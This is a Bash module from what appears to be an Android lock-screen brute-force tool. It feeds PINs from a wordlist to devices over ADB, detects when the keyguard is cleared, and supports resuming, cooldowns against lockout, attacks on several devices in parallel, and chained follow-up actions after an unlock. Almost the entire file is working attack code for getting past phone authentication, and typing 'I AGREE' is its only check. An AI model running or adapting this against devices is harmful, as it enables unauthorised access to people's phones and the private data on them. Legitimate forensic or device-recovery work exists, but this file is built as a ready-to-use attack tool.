#!/usr/bin/env bash
# lib/brute.sh — brute force, resume, manual, progress

BRUTE_PINS=()
BRUTE_TOTAL=0
UNLOCKED_DEVS=()

wake_device() {
  adb -s "$1" shell input keyevent KEYCODE_WAKEUP >/dev/null 2>&1
  sleep "${KEYEVENT_SLEEP:-1}"
}

send_pin() {
  local dev="$1" pin="$2"
  adb -s "$dev" shell input keyevent KEYCODE_MOVE_END >/dev/null 2>&1
  adb -s "$dev" shell input text "$pin"          >/dev/null 2>&1
  adb -s "$dev" shell input keyevent ENTER       >/dev/null 2>&1
}

is_unlocked() {
  local dev="$1" state focus
  state=$(adb -s "$dev" shell dumpsys window 2>/dev/null \
          | grep -m1 -E 'mDreamingLockscreen|mShowingLockscreen')
  echo "$state" | grep -q '=true' && return 1
  focus=$(adb -s "$dev" shell dumpsys window 2>/dev/null | grep -m1 'mCurrentFocus')
  echo "$focus" | grep -qi 'keyguard\|lockscreen' && return 1
  return 0
}

state_write() {
  local dev="$1" list="$2" idx="$3" pin="$4" unlocked="$5"
  local tmp; tmp=$(mktemp)
  [ -f "$CR42_STATE" ] && grep -v "^${dev}|" "$CR42_STATE" > "$tmp" || true
  printf '%s|%s|%s|%s|%s|%s\n' \
    "$dev" "$list" "$idx" "$pin" "$unlocked" "$(date -Iseconds)" >> "$tmp"
  mv "$tmp" "$CR42_STATE"
}

state_lookup() {
  local dev="$1"
  [ -f "$CR42_STATE" ] || return 1
  grep "^${dev}|" "$CR42_STATE" | tail -n1
}

draw_progress() {
  local cur=$1 total=$2 width=20
  local filled=$(( cur * width / (total>0?total:1) ))
  local bar="" i
  for ((i=0;i<filled;i++)); do bar+="#"; done
  for ((i=filled;i<width;i++)); do bar+="-"; done
  printf '[%s] %3d%%' "$bar" $(( cur*100/(total>0?total:1) ))
}

brute_force_one() {
  local dev="$1" listfile="$2" cooldown="$3" start_idx="${4:-0}"

  [ -r "$listfile" ] || { err "Cannot read $listfile"; return 1; }
  local total="${#BRUTE_PINS[@]}"
  [ "$total" -eq 0 ] && { err "No PINs"; return 1; }

  wake_device "$dev"
  if is_unlocked "$dev"; then
    warn "$dev already UNLOCKED — skipping"
    UNLOCKED_DEVS+=("$dev")
    return 0
  fi

  local attempt=$start_idx found="" pin
  local start_ts; start_ts=$(date +%s)

  for ((attempt=start_idx; attempt<total; attempt++)); do
    pin="${BRUTE_PINS[$attempt]}"
    printf '\r%s[%d/%d]%s %s ' "$c_bld" "$((attempt+1))" "$total" "$c_reset" "$dev"
    draw_progress "$((attempt+1))" "$total"
    printf ' trying: %-8s' "$pin"

    wake_device "$dev"
    send_pin "$dev" "$pin"
    sleep "${KEYEVENT_SLEEP:-1}"

    if is_unlocked "$dev"; then
      echo
      ok "$dev unlocked with: $pin"
      found="$pin"
      UNLOCKED_DEVS+=("$dev")
      state_write "$dev" "$listfile" "$attempt" "$pin" "1"
      [ -d "${LOG_DIR:-}" ] && echo "$pin" >> "$LOG_DIR/unlocked.txt"
      notify "Unlocked $dev with PIN $pin"
      break
    fi

    state_write "$dev" "$listfile" "$attempt" "$pin" "0"

    if (( (attempt+1) % ${WAIT_AFTER_TRIES:-3} == 0 )); then
      echo
      if [ "${cooldown:-0}" -gt 0 ]; then
        warn "Cooldown: sleeping ${cooldown}s ..."
        sleep "$cooldown"
        wake_device "$dev"
      else
        warn "Cooldown: sleeping skip ..."
      fi
    fi
  done
  echo

  local end_ts; end_ts=$(date +%s)
  log "$dev elapsed: $((end_ts - start_ts))s"

  if [ -n "$found" ]; then
    [ "${#CHAIN_ACTIONS[@]}" -gt 0 ] && chain_run_one "$dev"
    return 0
  fi
  err "$dev no matching PIN."
  return 2
}

brute_force_one_quiet() {
  local dev="$1"
  local saved=("${DEVICES[@]}")
  DEVICES=("$dev")
  brute_force_prompt
  DEVICES=("${saved[@]}")
}

brute_force_prompt() {
  local listfile cooldown
  read -rp "Path to PIN/password list file: " listfile
  [ -r "$listfile" ] || { err "Cannot read: $listfile"; return; }
  mapfile -t BRUTE_PINS < <(grep -vE '^\s*(#|$)' "$listfile")
  BRUTE_TOTAL="${#BRUTE_PINS[@]}"
  [ "$BRUTE_TOTAL" -gt 0 ] || { err "Empty list"; return; }

  echo
  echo "${c_bld}Select cooldown mode after every ${WAIT_AFTER_TRIES} attempts:${c_reset}"
  echo "  1) 15 seconds"
  echo "  2) 30 seconds"
  echo "  3) Skip (no cooldown)"
  echo "  4) Custom"
  local c; read -rp "Choice [1-4]: " c
  case "$c" in
    1) cooldown=15 ;;
    2) cooldown=30 ;;
    3) cooldown=0 ;;
    4) read -rp "Custom seconds: " cooldown
       [[ "$cooldown" =~ ^[0-9]+$ ]] || cooldown=15 ;;
    *) cooldown=15 ;;
  esac
  ok "Cooldown: ${cooldown}s"

  warn "About to try $BRUTE_TOTAL PIN(s) on ${#DEVICES[@]} device(s): ${DEVICES[*]}"
  read -rp "Type 'I AGREE' to continue: " ack
  [ "$ack" = "I AGREE" ] || { err "Aborted"; return; }

  auto_set_mode
  if [ "$EXEC_MODE" = "parallel" ]; then
    local d
    for d in "${DEVICES[@]}"; do
      ( brute_force_one "$d" "$listfile" "$cooldown" > "$LOG_DIR/${d//:/_}.log" 2>&1 ) &
    done
    wait
  else
    local d
    for d in "${DEVICES[@]}"; do
      brute_force_one "$d" "$listfile" "$cooldown"
    done
  fi
}

brute_force_resume() {
  [ -f "$CR42_STATE" ] || { err "No state file"; return; }
  local any_locked=0 d line list idx pin unlocked
  for d in "${DEVICES[@]}"; do
    line=$(state_lookup "$d") || continue
    IFS='|' read -r _ list idx pin unlocked _ <<< "$line"
    if [ "$unlocked" = "1" ]; then
      warn "$d already unlocked with $pin — skipping."
      continue
    fi
    [ -r "$list" ] || { warn "List $list missing for $d"; continue; }
    any_locked=1
    echo
    read -rp "Continue unlocking $d from index $((idx+1))? [y/N]: " yn
    [[ "$yn" =~ ^[Yy]$ ]] || { warn "Skipped $d"; continue; }
    mapfile -t BRUTE_PINS < <(grep -vE '^\s*(#|$)' "$list")
    BRUTE_TOTAL="${#BRUTE_PINS[@]}"
    log "Resuming $d from index $((idx+1)) / $BRUTE_TOTAL"
    brute_force_one "$d" "$list" "${COOLDOWN:-15}" "$((idx+1))"
  done
  [ "$any_locked" -eq 0 ] && ok "All devices in state.json are already unlocked."
}

brute_force_manual() {
  read -rp "Enter PIN to try: " pin
  [ -z "$pin" ] && { warn "No PIN"; return; }
  _pin="$pin"
  wrap_manual() { brute_manual_one "$1" "$_pin"; }
  for_each_device wrap_manual
}

brute_manual_one() {
  local dev="$1" pin="$2"
  ensure_online "$dev" || return
  wake_device "$dev"
  if is_unlocked "$dev"; then
    warn "$dev already unlocked — skipping manual PIN."
    return
  fi
  log "Trying manual PIN '$pin' on $dev ..."
  send_pin "$dev" "$pin"
  sleep "${KEYEVENT_SLEEP:-1}"
  if is_unlocked "$dev"; then
    ok "$dev unlocked with: $pin"
    [ -d "${LOG_DIR:-}" ] && echo "$pin" >> "$LOG_DIR/unlocked.txt"
    UNLOCKED_DEVS+=("$dev")
    notify "Unlocked $dev with PIN $pin"
  else
    err "$dev not unlocked with '$pin'."
  fi
}

menu_brute() {
  while :; do
    clear_screen; banner
    echo "${c_bld}=== Brute Force ===${c_reset}"
    echo "  1) Brute force only"
    echo "  2) Brute force + more action (chain)"
    echo "  3) Resume from state.json"
    echo "  4) Enter manually [e.g. 0004]"
    echo "  0) Back"
    echo
    echo "Execution: ${EXEC_MODE:-sequential}"
    echo
    local c; read -rp "Choice: " c
    case "$c" in
      1) CHAIN_ACTIONS=(); CHAIN_ARGS=(); brute_force_prompt; pause_enter ;;
      2) menu_chain ;;
      3) brute_force_resume; pause_enter ;;
      4) brute_force_manual; pause_enter ;;
      0) return 0 ;;
      *) warn "Invalid"; sleep 1 ;;
    esac
  done
}
